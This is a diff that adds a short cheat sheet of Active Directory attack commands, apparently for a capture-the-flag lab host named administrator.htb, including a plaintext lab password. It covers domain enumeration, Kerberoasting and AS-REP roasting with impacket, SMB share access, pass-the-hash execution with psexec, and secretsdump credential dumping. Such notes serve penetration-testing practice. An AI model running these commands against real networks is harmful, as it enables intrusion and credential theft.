@@ -1,0 +1,24 @@
+net user /domain
+
+
+net group "Domain Admins" /domain
+
+
+impacket-GetUserSPNs -request -dc-ip <dc-ip> <domain>/<username>:<password>
+impacket-GetUserSPNs -request -dc-ip 10.10.11.42 administrator.htb/Olivia:ichliebedich
+
+impacket-GetNPUsers -dc-ip 10.10.11.42 administrator.htb/Olivia:ichliebedich
+
+smbclient -L //10.10.11.42 -U Olivia
+
+
+smbclient //10.10.11.42/<sharename> -U Olivia
+
+
+impacket-psexec administrator.htb/Olivia@10.10.11.42 -hashes <NTLM_hash>
+
+impacket-secretsdump <domain>/<username>:<password>@<dc-ip>
+
+
+
+
